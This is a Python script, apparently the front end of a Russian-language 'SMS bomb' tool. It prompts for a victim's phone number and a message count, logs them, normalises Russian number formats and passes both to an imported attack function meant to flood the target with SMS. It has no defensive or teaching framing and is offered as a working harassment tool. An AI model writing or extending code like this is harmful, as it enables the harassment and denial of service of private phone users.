import datetime
import json
import os
import time

date_write = datetime.datetime.now()

from files.ban.banners import ban_sms_bomb
from files.credits.credits import credits
from files.services import servcies
from files.wrn.warn import file_not_found_log, i_e_colo, i_e_url_requ, keyboard

try:
    from colorama import Back, Fore, Style
except ImportError:
    i_e_colo()
try:
    import requests
except ImportError:
    i_e_url_requ

def cl():
    os.system("clear")

with open('files/config/config.json') as f:
    root_data = json.load(f)
root_usr = root_data.get("root_menu").get("root_menu_usr")

def start_bomb():
    try:
        try:
            FWS = open('files/log/log.txt', 'a', encoding='utf-8')
            FWI = open('files/log/log.txt', 'a', encoding='utf-8')
        except FileNotFoundError:
            file_not_found_log()
        cl()
        ban_sms_bomb()
        credits()
        FWS.write(f'{root_usr}:StartCode "sms_bomb" - ' + str(date_write) + '\n')
        FWS.close()
        print(Fore.YELLOW + 'Введите номер телефона. Пример:' + Style.RESET_ALL, Fore.CYAN + '+79021100147' + Style.RESET_ALL)
        input_number = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL + Style.NORMAL)
        FWI.write(f'{root_usr}:IntroducedCode "sms_bomb" - {str(input_number)} - ' + str(date_write) + '\n')
        FWI.close()
        print('\n')
        print(Fore.YELLOW + 'Кол-во смс' + Style.RESET_ALL)
        sms = int(input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL + Style.NORMAL))
        def parse_number(number):
            msg = f"[*]Проверка номера - Номер правильный!"
            if len(number) in (10, 11, 12):
                if number[0] == "8":
                    number = number[1:]
                    print(msg)
                elif number[:2] == "+7":
                    number = number[2:]
                    print(msg)
                elif int(len(number)) == 10 and number[0] == 9:
                    print(msg)
            else:
                print(f"[*]Проверка номера - Номер введён не правильно, проверьте номер телефона")
                time.sleep(5)
                quit()
            return number
        number = parse_number(input_number)
        servcies.attack(number, sms)
    except KeyboardInterrupt:
        keyboard()

def test_bomb():
    global cl
    print()
    cl()
